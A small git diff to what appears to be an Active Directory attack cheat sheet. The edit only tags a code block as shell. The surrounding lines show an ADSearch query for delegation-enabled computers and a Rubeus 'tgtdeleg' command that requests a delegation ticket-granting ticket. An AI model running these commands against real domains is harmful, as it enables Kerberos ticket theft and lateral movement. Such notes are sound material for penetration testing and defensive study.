@@ -265,7 +265,7 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 
 
 ### Delegation User
-```
+```shell
 # if you are using the Delegation service (in a shell of context of the service) 
 ## request a delegation TGT for the user
 .\Rubeus.exe tgtdeleg
